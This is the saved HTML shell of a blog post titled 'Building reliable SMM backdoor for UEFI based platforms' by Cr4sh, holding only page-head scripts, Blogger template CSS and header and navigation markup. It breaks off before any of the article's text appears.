<!DOCTYPE html>
<html class="v2" dir="ltr" xmlns="http://www.w3.org/1999/xhtml" xmlns:b="http://www.google.com/2005/gml/b" xmlns:data="http://www.google.com/2005/gml/data" xmlns:expr="http://www.google.com/2005/gml/expr"><head>
<meta content="IE=EmulateIE7" http-equiv="X-UA-Compatible">
<meta content="width=1100" name="viewport">
<meta content="text/html; charset=UTF-8" http-equiv="Content-Type">
<script async="" src="My%20aimful%20life:%20Building%20reliable%20SMM%20backdoor%20for%20UEFI%20based%20platforms_files/cbgapi.loaded_0"></script><script src="My%20aimful%20life:%20Building%20reliable%20SMM%20backdoor%20for%20UEFI%20based%20platforms_files/analytics.js" async=""></script><script type="text/javascript">(function() { var b=window,f="chrome",g="tick",k="jstiming";(function(){function d(a){this.t={};this.tick=function(a,d,c){var e=void 0!=c?c:(new Date).getTime();this.t[a]=[e,d];if(void 0==c)try{b.console.timeStamp("CSI/"+a)}catch(h){}};this[g]("start",null,a)}var a;b.performance&&(a=b.performance.timing);var n=a?new d(a.responseStart):new d;b.jstiming={Timer:d,load:n};if(a){var c=a.navigationStart,h=a.responseStart;0<c&&h>=c&&(b[k].srt=h-c)}if(a){var e=b[k].load;0<c&&h>=c&&(e[g]("_wtsrt",void 0,c),e[g]("wtsrt_","_wtsrt",h),e[g]("tbsd_","wtsrt_"))}try{a=null,
b[f]&&b[f].csi&&(a=Math.floor(b[f].csi().pageT),e&&0<c&&(e[g]("_tbnd",void 0,b[f].csi().startE),e[g]("tbnd_","_tbnd",c))),null==a&&b.gtbExternal&&(a=b.gtbExternal.pageT()),null==a&&b.external&&(a=b.external.pageT,e&&0<c&&(e[g]("_tbnd",void 0,b.external.startE),e[g]("tbnd_","_tbnd",c))),a&&(b[k].pt=a)}catch(p){}})();b.tickAboveFold=function(d){var a=0;if(d.offsetParent){do a+=d.offsetTop;while(d=d.offsetParent)}d=a;750>=d&&b[k].load[g]("aft")};var l=!1;function m(){l||(l=!0,b[k].load[g]("firstScrollTime"))}b.addEventListener?b.addEventListener("scroll",m,!1):b.attachEvent("onscroll",m);
 })();</script>
<meta content="blogger" name="generator">
<link href="http://blog.cr4.sh/favicon.ico" rel="icon" type="image/x-icon">
<link href="http://blog.cr4.sh/2015/07/building-reliable-smm-backdoor-for-uefi.html" rel="canonical">
<link rel="alternate" type="application/atom+xml" title="My aimful life - Atom" href="http://blog.cr4.sh/feeds/posts/default">
<link rel="alternate" type="application/rss+xml" title="My aimful life - RSS" href="http://blog.cr4.sh/feeds/posts/default?alt=rss">
<link rel="service.post" type="application/atom+xml" title="My aimful life - Atom" href="http://www.blogger.com/feeds/1259663162418910941/posts/default">

<link rel="alternate" type="application/atom+xml" title="My aimful life - Atom" href="http://blog.cr4.sh/feeds/1711940776197401016/comments/default">
<!--[if IE]><script type="text/javascript" src="https://www.blogger.com/static/v1/jsbin/1333113279-ieretrofit.js"></script>
<![endif]-->
<link href="My%20aimful%20life:%20Building%20reliable%20SMM%20backdoor%20for%20UEFI%20based%20platforms_files/phys-mem-map.png" rel="image_src">
<!--[if IE]> <script> (function() { var html5 = ("abbr,article,aside,audio,canvas,datalist,details," + "figure,footer,header,hgroup,mark,menu,meter,nav,output," + "progress,section,time,video").split(','); for (var i = 0; i < html5.length; i++) { document.createElement(html5[i]); } try { document.execCommand('BackgroundImageCache', false, true); } catch(e) {} })(); </script> <![endif]-->
<title>My aimful life: Building reliable SMM backdoor for UEFI based platforms</title>
<link type="text/css" rel="stylesheet" href="My%20aimful%20life:%20Building%20reliable%20SMM%20backdoor%20for%20UEFI%20based%20platforms_files/2088795018-css_bundle_v2.css">
<link type="text/css" rel="stylesheet" href="My%20aimful%20life:%20Building%20reliable%20SMM%20backdoor%20for%20UEFI%20based%20platforms_files/authorization.css">
<style id="page-skin-1" type="text/css"><!--
/*
-----------------------------------------------
Blogger Template Style
Name:     Awesome Inc.
Designer: Tina Chen
URL:      tinachen.org
----------------------------------------------- */
/* Variable definitions
====================
<Variable name="keycolor" description="Main Color" type="color" default="#ffffff"/>
<Group description="Page" selector="body">
<Variable name="body.font" description="Font" type="font"
default="normal normal 13px Arial, Tahoma, Helvetica, FreeSans, sans-serif"/>
<Variable name="body.background.color" description="Background Color" type="color" default="#000000"/>
<Variable name="body.text.color" description="Text Color" type="color" default="#ffffff"/>
</Group>
<Group description="Links" selector=".main-inner">
<Variable name="link.color" description="Link Color" type="color" default="#888888"/>
<Variable name="link.visited.color" description="Visited Color" type="color" default="#444444"/>
<Variable name="link.hover.color" description="Hover Color" type="color" default="#cccccc"/>
</Group>
<Group description="Blog Title" selector=".header h1">
<Variable name="header.font" description="Title Font" type="font"
default="normal bold 40px Arial, Tahoma, Helvetica, FreeSans, sans-serif"/>
<Variable name="header.text.color" description="Title Color" type="color" default="#000000" />
<Variable name="header.background.color" description="Header Background" type="color" default="transparent" />
</Group>
<Group description="Blog Description" selector=".header .description">
<Variable name="description.font" description="Font" type="font"
default="normal normal 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif"/>
<Variable name="description.text.color" description="Text Color" type="color"
default="#000000" />
</Group>
<Group description="Tabs Text" selector=".tabs-inner .widget li a">
<Variable name="tabs.font" description="Font" type="font"
default="normal bold 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif"/>
<Variable name="tabs.text.color" description="Text Color" type="color" default="#000000"/>
<Variable name="tabs.selected.text.color" description="Selected Color" type="color" default="#ffffff"/>
</Group>
<Group description="Tabs Background" selector=".tabs-outer .PageList">
<Variable name="tabs.background.color" description="Background Color" type="color" default="#141414"/>
<Variable name="tabs.selected.background.color" description="Selected Color" type="color" default="#444444"/>
<Variable name="tabs.border.color" description="Border Color" type="color" default="transparent"/>
</Group>
<Group description="Date Header" selector=".main-inner .widget h2.date-header, .main-inner .widget h2.date-header span">
<Variable name="date.font" description="Font" type="font"
default="normal normal 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif"/>
<Variable name="date.text.color" description="Text Color" type="color" default="#666666"/>
<Variable name="date.border.color" description="Border Color" type="color" default="transparent"/>
</Group>
<Group description="Post Title" selector="h3.post-title, h4, h3.post-title a">
<Variable name="post.title.font" description="Font" type="font"
default="normal bold 22px Arial, Tahoma, Helvetica, FreeSans, sans-serif"/>
<Variable name="post.title.text.color" description="Text Color" type="color" default="#000000"/>
</Group>
<Group description="Post Background" selector=".post">
<Variable name="post.background.color" description="Background Color" type="color" default="#fefdfa" />
<Variable name="post.border.color" description="Border Color" type="color" default="transparent" />
<Variable name="post.border.bevel.color" description="Bevel Color" type="color" default="transparent"/>
</Group>
<Group description="Gadget Title" selector="h2">
<Variable name="widget.title.font" description="Font" type="font"
default="normal bold 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif"/>
<Variable name="widget.title.text.color" description="Text Color" type="color" default="#000000"/>
</Group>
<Group description="Gadget Text" selector=".sidebar .widget">
<Variable name="widget.font" description="Font" type="font"
default="normal normal 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif"/>
<Variable name="widget.text.color" description="Text Color" type="color" default="#000000"/>
<Variable name="widget.alternate.text.color" description="Alternate Color" type="color" default="#666666"/>
</Group>
<Group description="Gadget Links" selector=".sidebar .widget">
<Variable name="widget.link.color" description="Link Color" type="color" default="#002655"/>
<Variable name="widget.link.visited.color" description="Visited Color" type="color" default="#002655"/>
<Variable name="widget.link.hover.color" description="Hover Color" type="color" default="#d52a33"/>
</Group>
<Group description="Gadget Background" selector=".sidebar .widget">
<Variable name="widget.background.color" description="Background Color" type="color" default="#141414"/>
<Variable name="widget.border.color" description="Border Color" type="color" default="#222222"/>
<Variable name="widget.border.bevel.color" description="Bevel Color" type="color" default="#000000"/>
</Group>
<Group description="Sidebar Background" selector=".column-left-inner .column-right-inner">
<Variable name="widget.outer.background.color" description="Background Color" type="color" default="transparent" />
</Group>
<Group description="Images" selector=".main-inner">
<Variable name="image.background.color" description="Background Color" type="color" default="transparent"/>
<Variable name="image.border.color" description="Border Color" type="color" default="transparent"/>
</Group>
<Group description="Feed" selector=".blog-feeds">
<Variable name="feed.text.color" description="Text Color" type="color" default="#000000"/>
</Group>
<Group description="Feed Links" selector=".blog-feeds">
<Variable name="feed.link.color" description="Link Color" type="color" default="#002655"/>
<Variable name="feed.link.visited.color" description="Visited Color" type="color" default="#002655"/>
<Variable name="feed.link.hover.color" description="Hover Color" type="color" default="#d52a33"/>
</Group>
<Group description="Pager" selector=".blog-pager">
<Variable name="pager.background.color" description="Background Color" type="color" default="#ffffff" />
</Group>
<Group description="Footer" selector=".footer-outer">
<Variable name="footer.background.color" description="Background Color" type="color" default="#fefdfa" />
<Variable name="footer.text.color" description="Text Color" type="color" default="#000000" />
</Group>
<Variable name="title.shadow.spread" description="Title Shadow" type="length" default="-1px"/>
<Variable name="body.background" description="Body Background" type="background"
color="#cccccc"
default="$(color) none repeat scroll top left"/>
<Variable name="body.background.gradient.cap" description="Body Gradient Cap" type="url"
default="none"/>
<Variable name="tabs.background.gradient" description="Tabs Background Gradient" type="url"
default="none"/>
<Variable name="header.background.gradient" description="Header Background Gradient" type="url" default="none" />
<Variable name="header.padding.top" description="Header Top Padding" type="length" default="22px" />
<Variable name="header.margin.top" description="Header Top Margin" type="length" default="0" />
<Variable name="header.margin.bottom" description="Header Bottom Margin" type="length" default="0" />
<Variable name="widget.padding.top" description="Widget Padding Top" type="length" default="8px" />
<Variable name="widget.padding.side" description="Widget Padding Side" type="length" default="15px" />
<Variable name="widget.outer.margin.top" description="Widget Top Margin" type="length" default="0" />
<Variable name="widget.outer.background.gradient" description="Gradient" type="url" default="none" />
<Variable name="widget.border.radius" description="Gadget Border Radius" type="length" default="0" />
<Variable name="outer.shadow.spread" description="Outer Shadow Size" type="length" default="0" />
<Variable name="date.header.border.radius.top" description="Date Header Border Radius Top" type="length" default="0" />
<Variable name="date.header.position" description="Date Header Position" type="length" default="15px" />
<Variable name="date.space" description="Date Space" type="length" default="30px" />
<Variable name="date.position" description="Date Float" type="string" default="static" />
<Variable name="date.padding.bottom" description="Date Padding Bottom" type="length" default="0" />
<Variable name="date.border.size" description="Date Border Size" type="length" default="0" />
<Variable name="date.background" description="Date Background" type="background" color="transparent"
default="$(color) none no-repeat scroll top left" />
<Variable name="date.first.border.radius.top" description="Date First top radius" type="length" default="0" />
<Variable name="date.last.space.bottom" description="Date Last Space Bottom" type="length"
default="20px" />
<Variable name="date.last.border.radius.bottom" description="Date Last bottom radius" type="length" default="0" />
<Variable name="post.first.padding.top" description="First Post Padding Top" type="length" default="0" />
<Variable name="image.shadow.spread" description="Image Shadow Size" type="length" default="0"/>
<Variable name="image.border.radius" description="Image Border Radius" type="length" default="0"/>
<Variable name="separator.outdent" description="Separator Outdent" type="length" default="15px" />
<Variable name="title.separator.border.size" description="Widget Title Border Size" type="length" default="1px" />
<Variable name="list.separator.border.size" description="List Separator Border Size" type="length" default="1px" />
<Variable name="shadow.spread" description="Shadow Size" type="length" default="0"/>
<Variable name="startSide" description="Side where text starts in blog language" type="automatic" default="left"/>
<Variable name="endSide" description="Side where text ends in blog language" type="automatic" default="right"/>
<Variable name="date.side" description="Side where date header is placed" type="string" default="right"/>
<Variable name="pager.border.radius.top" description="Pager Border Top Radius" type="length" default="0" />
<Variable name="pager.space.top" description="Pager Top Space" type="length" default="1em" />
<Variable name="footer.background.gradient" description="Background Gradient" type="url" default="none" />
*/
/* Content
----------------------------------------------- */
body {
font: normal normal 12px Verdana, Geneva, sans-serif;
color: #000000;
background: #cccccc none repeat scroll top left;
}
html body .content-outer {
min-width: 0;
max-width: 100%;
width: 100%;
}
a:link {
text-decoration: underline;
color: #002655;
}
a:visited {
text-decoration: underline;
color: #002655;
}
a:hover {
text-decoration: underline;
color: #d52a33;
}
.body-fauxcolumn-outer .cap-top {
position: absolute;
z-index: 1;
height: 276px;
width: 100%;
background: transparent none repeat-x scroll top left;
_background-image: none;
}
/* Columns
----------------------------------------------- */
.content-inner {
padding: 0;
}
.header-inner .section {
margin: 0 16px;
}
.tabs-inner .section {
margin: 0 16px;
}
.main-inner {
padding-top: 0;
}
.main-inner .column-center-inner,
.main-inner .column-left-inner,
.main-inner .column-right-inner {
padding: 0 5px;
}
*+html body .main-inner .column-center-inner {
margin-top: -0;
}
#layout .main-inner .column-center-inner {
margin-top: 0;
}
/* Header
----------------------------------------------- */
.header-outer {
padding-left: 33px;
margin: 0 0 0 0;
background: #222222 none repeat scroll 0 0;
}
.Header h1 {
font: normal normal 48px Georgia, Utopia, 'Palatino Linotype', Palatino, serif;
color: #f6ffe7;
text-shadow: 0 0 -1px #000000;
}
.Header h1 a {
color: #f6ffe7;
}
.Header .description {
font: normal normal 16px Georgia, Utopia, 'Palatino Linotype', Palatino, serif;
color: #b8b8b8;
}
.header-inner .Header .titlewrapper,
.header-inner .Header .descriptionwrapper {
padding-left: 0;
padding-right: 0;
margin-bottom: 0;
}
.header-inner .Header .titlewrapper {
padding-top: 22px;
}
/* Tabs
----------------------------------------------- */
.tabs-outer {
overflow: hidden;
position: relative;
background: #999999;
}
#layout .tabs-outer {
overflow: visible;
}
.tabs-cap-top, .tabs-cap-bottom {
position: absolute;
width: 100%;
border-top: 1px solid transparent;
}
.tabs-cap-bottom {
bottom: 0;
}
.tabs-inner .widget li a {
display: inline-block;
margin: 0;
padding: .6em 1.5em;
font: normal bold 13px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
color: #ffffff;
border-top: 1px solid transparent;
border-bottom: 1px solid transparent;
border-left: 1px solid transparent;
}
.tabs-inner .widget li:last-child a {
border-right: 1px solid transparent;
}
.tabs-inner .widget li.selected a, .tabs-inner .widget li a:hover {
background: #444444;
color: #ffffff;
}
/* Headings
----------------------------------------------- */
h2 {
font: normal bold 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
color: #333333;
}
/* Widgets
----------------------------------------------- */
.main-inner .section {
margin: 0 27px;
padding: 0;
}
.main-inner .column-left-outer,
.main-inner .column-right-outer {
margin-top: 0;
}
#layout .main-inner .column-left-outer,
#layout .main-inner .column-right-outer {
margin-top: 0;
}
.main-inner .column-left-inner,
.main-inner .column-right-inner {
background: transparent none repeat 0 0;
-moz-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
-webkit-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
-goog-ms-box-shadow: 0 0 0 rgba(0, 0, 0, .2);
box-shadow: 0 0 0 rgba(0, 0, 0, .2);
-moz-border-radius: 0;
-webkit-border-radius: 0;
-goog-ms-border-radius: 0;
border-radius: 0;
}
#layout .main-inner .column-left-inner,
#layout .main-inner .column-right-inner {
margin-top: 0;
}
.sidebar .widget {
font: normal normal 14px Arial, Tahoma, Helvetica, FreeSans, sans-serif;
color: #333333;
}
.sidebar .widget a:link {
color: #d52a33;
}
.sidebar .widget a:visited {
color: #7d181e;
}
.sidebar .widget a:hover {
color: #d52a33;
}
.sidebar .widget h2 {
text-shadow: 0 0 -1px #000000;
}
.main-inner .widget {
background-color: #fefdfa;
border: 1px solid transparent;
padding: 0 15px 15px;
margin: 20px -16px;
-moz-box-shadow: 0 0 20px rgba(0, 0, 0, .2);
-webkit-box-shadow: 0 0 20px rgba(0, 0, 0, .2);
-goog-ms-box-shadow: 0 0 20px rgba(0, 0, 0, .2);
box-shadow: 0 0 20px rgba(0, 0, 0, .2);
-moz-border-radius: 0;
-webkit-border-radius: 0;
-goog-ms-border-radius: 0;
border-radius: 0;
}
.main-inner .widget h2 {
margin: 0 -0;
padding: .6em 0 .5em;
border-bottom: 1px solid transparent;
}
.footer-inner .widget h2 {
padding: 0 0 .4em;
border-bottom: 1px solid transparent;
}
.main-inner .widget h2 + div, .footer-inner .widget h2 + div {
border-top: 1px solid transparent;
padding-top: 8px;
}
.main-inner .widget .widget-content {
margin: 0 -0;
padding: 7px 0 0;
}
.main-inner .widget ul, .main-inner .widget #ArchiveList ul.flat {
margin: -8px -15px 0;
padding: 0;
list-style: none;
}
.main-inner .widget #ArchiveList {
margin: -8px 0 0;
}
.main-inner .widget ul li, .main-inner .widget #ArchiveList ul.flat li {
padding: .5em 15px;
text-indent: 0;
color: #666666;
border-top: 0 solid transparent;
border-bottom: 1px solid transparent;
}
.main-inner .widget #ArchiveList ul li {
padding-top: .25em;
padding-bottom: .25em;
}
.main-inner .widget ul li:first-child, .main-inner .widget #ArchiveList ul.flat li:first-child {
border-top: none;
}
.main-inner .widget ul li:last-child, .main-inner .widget #ArchiveList ul.flat li:last-child {
border-bottom: none;
}
.post-body {
position: relative;
}
.main-inner .widget .post-body ul {
padding: 0 2.5em;
margin: .5em 0;
list-style: disc;
}
.main-inner .widget .post-body ul li {
padding: 0.25em 0;
margin-bottom: .25em;
color: #000000;
border: none;
}
.footer-inner .widget ul {
padding: 0;
list-style: none;
}
.widget .zippy {
color: #666666;
}
/* Posts
----------------------------------------------- */
body .main-inner .Blog {
padding: 0;
margin-bottom: 1em;
background-color: transparent;
border: none;
-moz-box-shadow: 0 0 0 rgba(0, 0, 0, 0);
-webkit-box-shadow: 0 0 0 rgba(0, 0, 0, 0);
-goog-ms-box-shadow: 0 0 0 rgba(0, 0, 0, 0);
box-shadow: 0 0 0 rgba(0, 0, 0, 0);
}
.main-inner .section:last-child .Blog:last-child {
padding: 0;
margin-bottom: 1em;
}
.main-inner .widget h2.date-header {
margin: 0 -15px 1px;
padding: 0 0 0 0;
font: normal normal 12px Arial;
color: #191919;
background: transparent none no-repeat scroll top left;
border-top: 0 solid #fcfbf5;
border-bottom: 1px solid transparent;
-moz-border-radius-topleft: 0;
-moz-border-radius-topright: 0;
-webkit-border-top-left-radius: 0;
-webkit-border-top-right-radius: 0;
border-top-left-radius: 0;
border-top-right-radius: 0;
position: static;
bottom: 100%;
right: 15px;
}
.main-inner .widget h2.date-header span {
font: normal normal 12px Arial;
display: block;
padding: .5em 15px;
border-left: 0 solid #fcfbf5;
border-right: 0 solid #fcfbf5;
}
.date-outer {
position: relative;
margin: 0 0 20px;
padding: 0 35px;
padding-top: 20px;
background-color: #ffffff;
border: 1px solid transparent;
-moz-box-shadow: 0 0 20px rgba(0, 0, 0, .2);
-webkit-box-shadow: 0 0 20px rgba(0, 0, 0, .2);
-goog-ms-box-shadow: 0 0 20px rgba(0, 0, 0, .2);
box-shadow: 0 0 20px rgba(0, 0, 0, .2);
-moz-border-radius: 0;
-webkit-border-radius: 0;
-goog-ms-border-radius: 0;
border-radius: 0;
}
.date-outer:first-child {
margin-top: 0;
}
.date-outer:last-child {
margin-bottom: 20px;
-moz-border-radius-bottomleft: 0;
-moz-border-radius-bottomright: 0;
-webkit-border-bottom-left-radius: 0;
-webkit-border-bottom-right-radius: 0;
-goog-ms-border-bottom-left-radius: 0;
-goog-ms-border-bottom-right-radius: 0;
border-bottom-left-radius: 0;
border-bottom-right-radius: 0;
}
.date-posts {
margin: 0 -0;
padding: 0 0;
clear: both;
}
.post-outer, .inline-ad {
border-top: 1px solid transparent;
margin: 0 -0;
padding: 15px 0;
}
.post-outer {
padding-bottom: 10px;
}
.post-outer:first-child {
padding-top: 0;
border-top: none;
}
.post-outer:last-child, .inline-ad:last-child {
border-bottom: none;
}
.post-body {
position: relative;
}
.post-body img {
padding: 0px;
background: #ffffff;
border: 1px solid #cccccc;
-moz-box-shadow: 0 0 0px rgba(0, 0, 0, .2);
-webkit-box-shadow: 0 0 0px rgba(0, 0, 0, .2);
box-shadow: 0 0 0px rgba(0, 0, 0, .2);
-moz-border-radius: 0px;
-webkit-border-radius: 0px;
border-radius: 0px;
}
h3.post-title, h4 {
font: normal normal 22px Georgia, Utopia, 'Palatino Linotype', Palatino, serif;
color: #000000;
padding-bottom: 10px;
}
h3.post-title a {
font: normal normal 22px Georgia, Utopia, 'Palatino Linotype', Palatino, serif;
color: #000000;
padding-bottom: 10px;
}
h3.post-title a:hover {
color: #d52a33;
text-decoration: underline;
}
.post-header {
margin: 0 0 1em;
}
.post-body {
line-height: 1.4;
}
.post-outer h2 {
color: #000000;
}
.post-footer {
padding-bottom: 20px;
margin: 1.5em 0 0;
}
#blog-pager {
padding: 15px;
font-size: 120%;
background-color: #ffffff;
border: 1px solid transparent;
-moz-box-shadow: 0 0 20px rgba(0, 0, 0, .2);
-webkit-box-shadow: 0 0 20px rgba(0, 0, 0, .2);
-goog-ms-box-shadow: 0 0 20px rgba(0, 0, 0, .2);
box-shadow: 0 0 20px rgba(0, 0, 0, .2);
-moz-border-radius: 0;
-webkit-border-radius: 0;
-goog-ms-border-radius: 0;
border-radius: 0;
-moz-border-radius-topleft: 0;
-moz-border-radius-topright: 0;
-webkit-border-top-left-radius: 0;
-webkit-border-top-right-radius: 0;
-goog-ms-border-top-left-radius: 0;
-goog-ms-border-top-right-radius: 0;
border-top-left-radius: 0;
border-top-right-radius-topright: 0;
margin-top: 1em;
}
.blog-feeds, .post-feeds {
margin: 1em 0;
text-align: center;
color: #333333;
}
.blog-feeds a, .post-feeds a {
color: #d52a33;
}
.blog-feeds a:visited, .post-feeds a:visited {
color: #7d181e;
}
.blog-feeds a:hover, .post-feeds a:hover {
color: #d52a33;
}
.post-outer .comments {
margin-top: 2em;
}
/* Footer
----------------------------------------------- */
.footer-outer {
margin: -20px 0 -1px;
padding: 20px 0 0;
color: #333333;
overflow: hidden;
}
.footer-fauxborder-left {
border-top: 1px solid transparent;
background: #fefdfa none repeat scroll 0 0;
-moz-box-shadow: 0 0 20px rgba(0, 0, 0, .2);
-webkit-box-shadow: 0 0 20px rgba(0, 0, 0, .2);
-goog-ms-box-shadow: 0 0 20px rgba(0, 0, 0, .2);
box-shadow: 0 0 20px rgba(0, 0, 0, .2);
margin: 0 -20px;
}
/* Mobile
----------------------------------------------- */
*+html body.mobile .main-inner .column-center-inner {
margin-top: 0;
}
.mobile .main-inner {
padding-top: 0;
}
.mobile .main-inner .widget {
padding: 0 0 15px;
}
.mobile .main-inner .widget h2 + div,
.mobile .footer-inner .widget h2 + div {
border-top: none;
padding-top: 0;
}
.mobile .footer-inner .widget h2 {
padding: 0.5em 0;
border-bottom: none;
}
.mobile .main-inner .widget .widget-content {
margin: 0;
padding: 7px 0 0;
}
.mobile .main-inner .widget ul,
.mobile .main-inner .widget #ArchiveList ul.flat {
margin: 0 -15px 0;
}
.mobile .main-inner .widget h2.date-header {
right: 0;
}
.mobile .date-header span {
padding: 0.4em 0;
}
.mobile .date-outer:first-child {
margin-bottom: 0;
border: 1px solid transparent;
-moz-border-radius-topleft: 0;
-moz-border-radius-topright: 0;
-webkit-border-top-left-radius: 0;
-webkit-border-top-right-radius: 0;
-goog-ms-border-top-left-radius: 0;
-goog-ms-border-top-right-radius: 0;
border-top-left-radius: 0;
border-top-right-radius: 0;
}
.mobile .date-outer {
border-color: transparent;
border-width: 0 1px 1px;
}
.mobile .date-outer:last-child {
margin-bottom: 0;
}
.mobile .main-inner {
padding: 20px 10px;
}
.mobile .header-inner .section {
margin: 0;
}
.mobile .post-outer, .mobile .inline-ad {
padding: 5px 0;
}
.mobile .tabs-inner .section {
margin: 0 10px;
}
.mobile .main-inner .section {
margin: 0;
}
.mobile .main-inner .widget h2 {
margin: 0;
padding: 0;
}
.mobile .main-inner .widget h2.date-header span {
padding: 0;
}
.mobile .main-inner .widget .widget-content {
margin: 0;
padding: 7px 0 0;
}
.mobile .main-inner .column-center-inner,
.mobile .main-inner .column-left-inner,
.mobile .main-inner .column-right-inner {
padding: 0;
}
.mobile .main-inner .column-left-inner,
.mobile .main-inner .column-right-inner {
background: transparent none repeat 0 0;
-moz-box-shadow: none;
-webkit-box-shadow: none;
-goog-ms-box-shadow: none;
box-shadow: none;
}
.mobile .date-posts {
margin: 0;
padding: 0;
}
.mobile .footer-fauxborder-left {
margin: 0;
}
.mobile .main-inner .section:last-child .Blog:last-child {
margin-bottom: 0;
}
.mobile .mobile-link-button {
background: #444444 url(http://www.blogblog.com/1kt/awesomeinc/tabs_gradient_light.png) repeat-x scroll 0 -100px;
}
.mobile-link-button a:link, .mobile-link-button a:visited {
color: #ffffff;
}
div.figure pre
{
text-align: left;
}
pre
{
border: none;
background: #EEEEEE;
padding: 1ex 1em;
overflow: auto;
font-size: 10pt;
}
pre, code
{
font-family: Lucida Console, monospace;
}
pre.oneliner
{
white-space: pre-wrap;
}
a {
text-decoration: underline;
}
--></style>
<style id="template-skin-1" type="text/css"><!--
body {
min-width: 930px;
}
.repost
{
text-align: left;
background-color: #fff2cc;
padding: 10 10 10 10;
width: 90%;
height: 50 px;
}
.content-outer, .content-fauxcolumn-outer, .region-inner {
min-width: 930px;
max-width: 930px;
_width: 930px;
}
.main-inner .columns {
padding-left: 0px;
padding-right: 0px;
}
.main-inner .fauxcolumn-center-outer {
left: 0px;
right: 0px;
/* IE6 does not respect left and right together */
_width: expression(this.parentNode.offsetWidth -
parseInt("0px") -
parseInt("0px") + 'px');
}
.main-inner .fauxcolumn-left-outer {
width: 0px;
}
.main-inner .fauxcolumn-right-outer {
width: 0px;
}
.main-inner .column-left-outer {
width: 0px;
right: 100%;
margin-left: -0px;
}
.main-inner .column-right-outer {
width: 0px;
margin-right: -0px;
}
#layout {
min-width: 0;
}
#layout .content-outer {
min-width: 0;
width: 800px;
}
#layout .region-inner {
min-width: 0;
width: auto;
}
--></style>
<script type="text/javascript">var a="indexOf",b="&m=1",e="(^|&)m=",f="?",g="?m=1";function h(){var c=window.location.href,d=c.split(f);switch(d.length){case 1:return c+g;case 2:return 0<=d[1].search(e)?null:c+b;default:return null}}var k=navigator.userAgent;if(-1!=k[a]("Mobile")&&-1!=k[a]("WebKit")&&-1==k[a]("iPad")||-1!=k[a]("Opera Mini")||-1!=k[a]("IEMobile")){var l=h();l&&window.location.replace(l)};
</script><script type="text/javascript">
if (window.jstiming) window.jstiming.load.tick('headEnd');
</script></head>
<body class="">
<div class="body-fauxcolumns">
<div class="fauxcolumn-outer body-fauxcolumn-outer">
<div class="cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left">
<div class="fauxborder-right"></div>
<div class="fauxcolumn-inner">
</div>
</div>
<div class="cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
</div>
<div class="content">
<div class="content-fauxcolumns">
<div class="fauxcolumn-outer content-fauxcolumn-outer">
<div class="cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left">
<div class="fauxborder-right"></div>
<div class="fauxcolumn-inner">
</div>
</div>
<div class="cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
</div>
<div class="content-outer">
<div class="content-cap-top cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left content-fauxborder-left">
<div class="fauxborder-right content-fauxborder-right"></div>
<div class="content-inner">
<header>
<div class="header-outer">
<div class="header-cap-top cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left header-fauxborder-left">
<div class="fauxborder-right header-fauxborder-right"></div>
<div class="region-inner header-inner">
<div class="header section" id="header"><div class="widget Header" id="Header1">
<div id="header-inner">
<div class="titlewrapper">
<h1 class="title">
<a href="http://blog.cr4.sh/">My aimful life</a>
</h1>
</div>
<div class="descriptionwrapper">
<p class="description" style="padding-bottom: 20px;"><span>Another web log by Dmytro Oleksiuk aka Cr4sh</span></p>
</div>
</div>
</div></div>
</div>
</div>
<div class="header-cap-bottom cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
</header>
<div class="tabs-outer">
<div class="tabs-cap-top cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left tabs-fauxborder-left">
<div class="fauxborder-right tabs-fauxborder-right"></div>
<div class="region-inner tabs-inner">
<div class="tabs section" id="crosscol"><div class="widget PageList" id="PageList1">
<h2>Pages</h2>
<div class="widget-content">
<ul>
<li><a href="http://blog.cr4.sh/">Главная страница</a></li>
<li><a href="http://blog.cr4.sh/p/blog-page.html">About</a></li>
</ul>
<div class="clear"></div>
<span class="widget-item-control">
<span class="item-control blog-admin">
<a class="quickedit" href="http://www.blogger.com/rearrange?blogID=1259663162418910941&amp;widgetType=PageList&amp;widgetId=PageList1&amp;action=editWidget&amp;sectionId=crosscol" onclick='return _WidgetManager._PopupConfig(document.getElementById("PageList1"));' target="configPageList1" title="Edit">
<img alt="" src="My%20aimful%20life:%20Building%20reliable%20SMM%20backdoor%20for%20UEFI%20based%20platforms_files/icon18_wrench_allbkg.png" height="18" width="18">
</a>
</span>
</span>
<div class="clear"></div>
</div>
</div></div>
<div class="tabs section" id="crosscol-overflow"></div>
</div>
</div>
<div class="tabs-cap-bottom cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
<div class="main-outer">
<div class="main-cap-top cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left main-fauxborder-left">
<div class="fauxborder-right main-fauxborder-right"></div>
<div class="region-inner main-inner">
<div class="columns fauxcolumns">
<div class="fauxcolumn-outer fauxcolumn-center-outer">
<div class="cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left">
<div class="fauxborder-right"></div>
<div class="fauxcolumn-inner">
</div>
</div>
<div class="cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
<div class="fauxcolumn-outer fauxcolumn-left-outer">
<div class="cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
<div class="fauxborder-left">
<div class="fauxborder-right"></div>
<div class="fauxcolumn-inner">
</div>
</div>
<div class="cap-bottom">
<div class="cap-left"></div>
<div class="cap-right"></div>
</div>
</div>
<div class="fauxcolumn-outer fauxcolumn-right-outer">
<div class="cap-top">
<div class="cap-left"></div>
<div class="cap-right"></div>
